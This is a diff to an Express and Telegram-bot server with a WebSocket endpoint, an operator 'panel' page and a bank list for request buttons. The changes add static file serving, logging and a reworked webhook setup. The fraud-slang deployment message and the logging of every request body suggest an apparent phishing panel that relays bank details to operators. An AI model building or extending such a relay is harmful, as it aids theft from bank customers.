@@ -17,6 +17,7 @@ const banksForRequestButton = [
 const app = express();
 app.use(express.json());
 app.use(cors());
+app.use(express.static(path.join(__dirname)));
 
 app.use((req, res, next) => {
     console.log(`${new Date().toISOString()} - ${req.method} ${req.url} - Body: ${JSON.stringify(req.body)}`);
@@ -24,28 +25,31 @@ app.use((req, res, next) => {
 });
 
 app.get('/', (req, res) => {
+    console.log('Serving index.html');
     res.sendFile(path.join(__dirname, 'index.html'));
 });
 
 app.get('/panel', (req, res) => {
+    console.log('Serving panel.html');
     res.sendFile(path.join(__dirname, 'panel.html'));
 });
 
 const bot = new TelegramBot(TELEGRAM_BOT_TOKEN, { polling: false });
 
-// Очистка старого webhook
-fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/deleteWebhook`)
-    .then(() => console.log('Old webhook deleted'))
-    .catch(err => console.error('Error deleting old webhook:', err));
+async function setupWebhook() {
+    try {
+        await fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/deleteWebhook`);
+        console.log('Old webhook deleted');
+        await bot.setWebHook(WEBHOOK_URL);
+        console.log(`Webhook set to ${WEBHOOK_URL}`);
+    } catch (err) {
+        console.error('Webhook setup error:', err);
+    }
+}
 
-// Установка нового webhook
-bot.setWebHook(WEBHOOK_URL).then(() => {
-    console.log(`Webhook set to ${WEBHOOK_URL}`);
-}).catch(err => {
-    console.error('Error setting webhook:', err);
-});
+setupWebhook();
 
-bot.sendMessage(CHAT_ID, 'ПРОЕКТ УСПЕШНО СТАЛ НА СЕРВЕР! Хорошего ворка! Тест от ' + new Date().toISOString(), { parse_mode: 'HTML' }).catch(err => console.error('Test send error:', err));
+bot.sendMessage(CHAT_ID, 'ПРОЕКТ УСПЕШНО СТАЛ НА СЕРВЕР! Тест от ' + new Date().toISOString(), { parse_mode: 'HTML' }).catch(err => console.error('Test send error:', err));
 
 bot.getMe().then(me => console.log(`Bot started: @${me.username}`)).catch(err => console.error('Bot error:', err));
 
@@ -55,7 +59,7 @@ app.post(`/bot${TELEGRAM_BOT_TOKEN}`, (req, res) => {
 });
 
 const server = require('http').createServer(app);
-const wss = new WebSocket.Server({ 
+const wss = new WebSocket.Server({
     server,
     path: '/ws'
 });
